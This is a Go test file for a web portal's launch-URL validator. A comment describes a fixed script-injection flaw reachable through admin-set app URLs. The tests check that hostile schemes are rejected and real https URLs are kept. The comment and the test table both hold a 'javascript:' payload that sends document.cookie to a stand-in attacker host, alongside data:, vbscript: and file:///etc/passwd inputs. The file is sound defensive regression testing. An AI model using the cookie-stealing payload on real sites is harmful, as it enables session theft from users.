package app

import "testing"

// The portal navigates to whatever GetAppLaunchURL returns —
// win.location.replace(launch_url) — and several of its branches hand back a
// URL an administrator typed into the console (home_url, a form app's
// login_url). Those fields carry only a length constraint, so
// "javascript:..." was storable and was returned verbatim; confirmed against a
// live instance, which answered
//
//	{"launch_url":"javascript:fetch(\"https://evil.example/\"+document.cookie)"}
//
// That is script execution on the portal's own origin, in every user's browser,
// reachable by anyone holding app.update.

func TestLaunchableURL_RejectsNonBrowsableSchemes(t *testing.T) {
	for name, raw := range map[string]string{
		"javascript":           `javascript:fetch("https://evil.example/"+document.cookie)`,
		"javascript uppercase": "JavaScript:alert(1)",
		"javascript padded":    "  javascript:alert(1)  ",
		"data":                 "data:text/html,<script>alert(1)</script>",
		"vbscript":             "vbscript:msgbox(1)",
		"file":                 "file:///etc/passwd",
		"relative path":        "/apps",
		"protocol relative":    "//evil.example/x",
		"bare host":            "evil.example/x",
		"scheme without host":  "https://",
		"empty":                "",
	} {
		t.Run(name, func(t *testing.T) {
			if got := launchableURL(raw); got != "" {
				t.Fatalf("accepted %q and returned %q; the portal navigates to this value", raw, got)
			}
		})
	}
}

func TestLaunchableURL_KeepsRealApplicationURLs(t *testing.T) {
	for name, raw := range map[string]string{
		"https":            "https://app.example.com/login",
		"http":             "http://app.internal:8080/sso/start",
		"with query":       "https://app.example.com/login?next=%2Fdash",
		"with port + path": "https://app.example.com:8443/a/b",
	} {
		t.Run(name, func(t *testing.T) {
			if got := launchableURL(raw); got != raw {
				t.Fatalf("rejected or altered %q (got %q); this is a legitimate launch target and "+
					"refusing it breaks the app tile", raw, got)
			}
		})
	}
}
